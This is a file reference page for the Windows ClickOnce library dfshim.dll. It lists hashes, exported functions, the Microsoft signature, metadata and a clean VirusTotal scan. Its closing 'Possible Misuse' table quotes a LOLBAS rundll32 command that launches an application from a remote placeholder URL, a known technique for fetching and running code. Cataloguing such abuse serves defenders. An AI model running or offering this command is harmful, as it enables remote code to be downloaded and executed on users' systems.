---
title: dfshim.dll | ClickOnce Application Deployment Support Library
excerpt: What is dfshim.dll?
---

# dfshim.dll 

* File Path: `C:\Windows\system32\dfshim.dll`
* Description: ClickOnce Application Deployment Support Library

## Hashes

Type | Hash
-- | --
MD5 | `85471BF1E885DF57FF1EE9772BAFCC35`
SHA1 | `898C0B9415524BFEBB1DD5EDB1CAA9DC91F19363`
SHA256 | `65CB5A9E02A25267AC0CEDD9CA048DFE45C38B8D0FD224773450F9799BDA7FB0`
SHA384 | `4A543660C7C4117AFC2B6072A1CF7ABB91DD48607C56AE4927AEF876702FB70247A6366597495F0BD81DB4743649ED6F`
SHA512 | `C085F33E152A92263F71325864BC939EE16A6A0A3377385C817DBBC7DEBDAC9CE5F32C5C67011292CDFB82AB2B57AE84D774EE732621EA821569008B172169C2`
SSDEEP | `12288:Yv86KwAE1oHnkWR/WBbavF0w6CTz5de1RxIKxbWJxKORHtd4cnBZ3H+U6uU85WNa:LWHMnko65rM+p9fkyt7KLgHt7o`
IMP | `71F2605719AC7F33662181495B79B766`
PESHA1 | `827C99BE1B389DD22B1C12F32DC493231C73BC45`
PE256 | `164D8FD78D69A8D4823C1FF12C70ED97AC6EBB7D0222BF2AA8D34B22B6C31C20`

## DLL Exports:

Function Name | Ordinal | Type | Address | Relative Address
-- | -- | -- | -- | --
`CleanOnlineAppCache` | 17 (0x11) | Exported Function | 0x0000000180001a50 | 0x00001a50
`ShOpenVerbExtensionW` | 14 (0xe) | Exported Function | 0x0000000180001500 | 0x00001500
`ShOpenVerbExtension` | 13 (0xd) | Exported Function | 0x00000001800015f0 | 0x000015f0
`ShOpenVerbApplicationW` | 12 (0xc) | Exported Function | 0x00000001800014c0 | 0x000014c0
`ShOpenVerbApplication` | 11 (0xb) | Exported Function | 0x00000001800014e0 | 0x000014e0
`ShArpMaintainW` | 10 (0xa) | Exported Function | 0x0000000180001700 | 0x00001700
`ShArpMaintain` | 9 (0x9) | Exported Function | 0x0000000180001870 | 0x00001870
`ParseManifest` | 8 (0x8) | Exported Function | 0x00000001800051a0 | 0x000051a0
`LaunchApplication` | 7 (0x7) | Exported Function | 0x00000001800016e0 | 0x000016e0
`KillService` | 6 (0x6) | Exported Function | 0x00000001800019e0 | 0x000019e0
`GetUserStore` | 5 (0x5) | Exported Function | 0x00000001800050a0 | 0x000050a0
`GetUserStateManager` | 4 (0x4) | Exported Function | 0x0000000180005120 | 0x00005120
`GetDeploymentDataFromManifest` | 20 (0x14) | Exported Function | 0x0000000180001b40 | 0x00001b40
`GetCurrentActContext` | 3 (0x3) | Exported Function | 0x0000000180005300 | 0x00005300
`DllGetClassObject` | 19 (0x13) | Exported Function | 0x0000000180001100 | 0x00001100
`DllCanUnloadNow` | 18 (0x12) | Exported Function | 0x0000000180001080 | 0x00001080
`CreateCMSFromXml` | 2 (0x2) | Exported Function | 0x0000000180005220 | 0x00005220
`CreateActContext` | 1 (0x1) | Exported Function | 0x00000001800052a0 | 0x000052a0
`ShOpenVerbShortcut` | 15 (0xf) | Exported Function | 0x0000000180001390 | 0x00001390
`ShOpenVerbShortcutW` | 16 (0x10) | Exported Function | 0x0000000180001230 | 0x00001230


## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: dfshim.dll
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.19041.1 (WinBuild.160101.0800)
* Product Version: 10.0.19041.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/71
* VirusTotal Link: https://www.virustotal.com/gui/file/65cb5a9e02a25267ac0cedd9ca048dfe45c38b8d0fd224773450f9799bda7fb0/detection/


## Possible Misuse

*The following table contains possible examples of `dfshim.dll` being misused. While `dfshim.dll` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Dfsvc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dfsvc.yml) | `- Command: rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo ` | 



MIT License. Copyright (c) 2020 Strontic.


